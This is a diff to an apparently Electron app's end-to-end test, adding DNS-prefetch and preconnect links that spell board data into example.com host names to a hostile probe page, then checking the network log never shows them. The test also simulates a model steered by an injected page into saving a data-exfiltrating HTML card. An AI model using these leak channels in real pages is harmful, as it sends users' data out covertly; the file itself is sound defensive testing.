@@ -1032,6 +1032,9 @@ test("a file dropped on the board goes to the card a line takes it to, and a car
 
 // A page that tries every way out it can, against a server only this test runs, and writes down what it saw in its own
 // page. Each address carries the board's data, as a real attempt would.
+// A host name only this test looks for, which a page could spell its data out in.
+const DNS_LABEL = `nest-probe-${process.pid}`;
+
 const probePage = (port: number) => {
   const to = (path: string) => `http://127.0.0.1:${port}/${path}`;
   // A peer connection to a STUN server and to a TURN server over TCP, which the WebRTC policy alone doesn't stop.
@@ -1043,6 +1046,8 @@ const probePage = (port: number) => {
 <meta http-equiv="refresh" content="1;url=${to("refresh")}">
 <link rel="dns-prefetch" href="http://probe.localhost:${port}/">
 <link rel="dns-prefetch" href="${to("dns")}">
+<link rel="dns-prefetch" href="https://${DNS_LABEL}-markup.example.com/">
+<link rel="preconnect" href="https://${DNS_LABEL}-preconnect.example.com/">
 <link rel="preconnect" href="${to("preconnect")}">
 <link rel="preconnect" href="http://probe.localhost:${port}/">
 <link rel="prefetch" href="${to("prefetch")}">
@@ -1071,6 +1076,7 @@ try { navigator.sendBeacon("${to("beacon")}", data); } catch {}
 try { new WebSocket("ws://127.0.0.1:${port}/ws"); } catch {}
 try { new EventSource("${to("events")}"); } catch {}
 try { new Image().src = "${to("image")}?" + data; } catch {}
+for (const rel of ["dns-prefetch", "preconnect", "prefetch"]) try { const link = document.createElement("link"); link.rel = rel; link.href = "https://${DNS_LABEL}-" + rel + "-" + data.length + ".example.com/"; document.head.append(link); } catch {}
 try { const script = document.createElement("script"); script.src = "${to("dynamic.js")}?" + data; document.head.append(script); } catch {}
 try { document.getElementById("f").submit(); } catch {}
 for (const id of ["blank", "top", "js"]) try { document.getElementById(id).click(); } catch {}
@@ -1158,6 +1164,10 @@ test("a card makes an HTML card that charts its real data live, and a hostile on
     await table.getByLabel("Pull a new card out of deals").click();
     const card = chrome.locator(".react-flow__node").nth(1);
 
+    // Every host name anything in the app looks up shows in the net log, so a lookup a page spells data out in would.
+    const netLogFile = join(mkdtempSync(join(tmpdir(), "blueberry-net-")), "net.json");
+    await app.evaluate(({ netLog }, path) => netLog.startLogging(path), netLogFile);
+
     // Its bird makes two pages in one reply: a chart, and one a page steered it into, which tries to send the data out.
     model.callTools(
       { name: "save_file", args: { name: "deals chart", kind: "html", content: CHART_PAGE } },
@@ -1201,6 +1211,8 @@ test("a card makes an HTML card that charts its real data live, and a hostile on
     expect(requests).toEqual([]);
     expect(connections).toBe(0);
     expect(datagrams).toBe(0);
+    await app.evaluate(({ netLog }) => netLog.stopLogging());
+    expect(readFileSync(netLogFile, "utf8")).not.toContain(DNS_LABEL);
     // Each card is still its own page, and nothing opened a tab or a window anywhere. A frame inside the page the policy
     // refused still names where it was meant to go, though nothing went there.
     const reached = await app.evaluate(({ webContents }, port) => {
